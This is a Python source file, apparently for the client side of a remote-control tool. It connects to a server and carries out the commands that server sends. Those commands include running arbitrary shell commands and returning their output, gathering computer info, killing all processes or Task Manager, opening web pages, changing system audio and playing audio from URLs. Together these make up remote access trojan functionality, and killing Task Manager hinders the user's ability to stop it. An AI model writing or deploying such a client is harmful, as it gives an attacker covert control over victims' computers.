from utilities import getComputerInfo, testSong, setAudio, setSystemMute, generateFFPLAY, ffplayFromURL, executeCommandAsync, clearConsole
from packer import packV1, parsePackV1, ContentTypes, CommandTypes, Pack
from env import SERVER_PORT, IS_DEV, EXIT_KEYS, SPLITTER, CLEAR_KEYS
from logger import info, getLog
from interfaces import Command
from typing import List, Any
from threading import Thread
from tk import readlog
import closeProcess
import webbrowser
import processes
import socket
import shared
import uuid
import time
import sys




argv = sys.argv[1:]


if "dev" in argv:
    IS_DEV = True




class Client:
    def __init__(self, ip: str):
        self.is_running = True

        self.commands: List[Command] = []
        self.tasks: List[Thread] = []
        self._buffer = b''

        self._uuid: str = None

        self.command_type: CommandTypes = CommandTypes.COMMON_COMMAND

        self.server = socket.socket()
        self.server.connect((ip, SERVER_PORT))
        self.server.settimeout(5)


        



    def run_forest(self):
        tasks: List[Thread] = [
            Thread(target=self.listening, args=())
        ]

        if IS_DEV:
            tasks.append(
                Thread(target=self.controller, args=())
            )

            self.sendData("UpRole", ContentTypes.STR, "ADMIN", None, CommandTypes.COMMON_COMMAND)



        for task in tasks:
            task.start()
            self.tasks.append(task)


        while self.is_running:
            time.sleep(1)



    def controller(self):
        while self.is_running:
            try:
                command = input(self.command_type.value).strip()
                

                if not command:
                    continue


                if len(command) == 2 and command.startswith("/") and command[-1] in [_.value for _ in CommandTypes]:
                    command_type = CommandTypes(command[-1])
                    print(command_type)

                    self.command_type = command_type
                    continue


                if command in EXIT_KEYS:
                    closeProcess.closeProcess()
                    break


                if command in CLEAR_KEYS:
                    clearConsole()
                    continue



                self.sendData(command, ContentTypes.STR, command, self.getCommandRefID, self.command_type, self.getUUID)


            except Exception as ex:
                print("ERROR Server.controller: ", ex)
                break


        self.close()


    def listening(self):
        while self.is_running:
            try:
                data = self.server.recv(1024)


                if not data:
                    break


                self._buffer += data


                while SPLITTER in self._buffer:
                    indexOf = self._buffer.index(SPLITTER)
                    _command = self._buffer[:indexOf]
                    self._buffer = self._buffer[indexOf + len(SPLITTER):]

                    command = parsePackV1(_command)


                    if not command:
                        raise Exception("parsePackV1 Error: ", _command)


                    self.onCommand(command)


            except TimeoutError:
                continue


            except Exception as ex:
                print(ex)
                break


        self.close()


    def onCommand(self, command: Pack):
        
        print(command)
        
        if command.name == "GetComputerInfo":
            data = getComputerInfo()
            self.sendData("ComputerInfo", ContentTypes.JSON, data, command.ref_id, CommandTypes.COMMON_COMMAND)


        elif command.name == "SetUUID":
            self._uuid = command.data
        

        elif command.name == "ClientList":
            print(command.data)
        

        elif command.name == "DownloadUrl":
            print(command.data)
        

        elif command.name == "TEST_SONG":
            ffplay_path = generateFFPLAY()


            if ffplay_path:
                info("ffplay_path: " + ffplay_path)

                Thread(target=testSong, args=(ffplay_path, )).start()


        elif command.name == "SET_SYSTEM_MUTE":
            setSystemMute(**command.data)


        elif command.name == "SET_AUDIO_PERCEN":
            setAudio(**command.data)
        

        elif command.name == "KILL_ALL":
            processes.killALL()
        

        elif command.name == "KILL_TASK_MGR":
            processes.killTaskMgr()
        

        elif command.name == "CLEAN_FFPLAY":
            pass

        elif command.name == "CODE_INFO":
            pass


        elif command.name == "FFPLAY_FROM":
            ffplay_path = generateFFPLAY()


            if ffplay_path:
                info("ffplay_path: " + ffplay_path)

                Thread(target=ffplayFromURL, args=(command.data, ffplay_path, )).start()
            

        elif command.name == "KILL_PROC_WITH_NAME":
            processes.killProcessWithName(command.data)
        

        elif command.name == "WEB_OPEN":
            webbrowser.open(command.data)
        

        elif command.name == "EXEC":
            Thread(
                target=executeCommandAsync, args=(
                    command.data, 
                    lambda e: self.sendData("EXEC_RESPONSE", ContentTypes.STR, e, command.ref_id, CommandTypes.COMMON_COMMAND)
                )
            ).start()


        elif command.name == "GET_LOG":
            self.sendData("LOG_RESPONSE", ContentTypes.STR, getLog(), command.ref_id, CommandTypes.COMMON_COMMAND, command.from_sender)


        elif command.name == "LOG_RESPONSE":
            readlog.readLog("Log of User", command.data)


        elif command.name == "PING":
            self.sendData("PONG", ContentTypes.STR, "", None, CommandTypes.COMMON_COMMAND, None)


        else:
            print(command)



    def sendData(self, name: str, content_type: ContentTypes, body: Any, ref_id: str = None, command_type: CommandTypes = CommandTypes.COMMON_COMMAND, from_sender: str = None):
        if not self.server:
            return None
        

        self.server.sendall(packV1(name, content_type, body, ref_id, command_type, from_sender))
        return True


    def close(self):
        if self.is_running:
            self.server.close()
            self.commands = []
            self.tasks = []
            self.is_running = False


    @property
    def getAllCommandRefID(self):
        return map(lambda e: e.ref_id, self.commands)
    

    @property
    def getCommandRefID(self):
        while True:
            v4 = str(uuid.uuid4())

            if v4 not in self.getAllCommandRefID:
                return v4
            


    @property
    def getUUID(self):
        return self._uuid
            


    





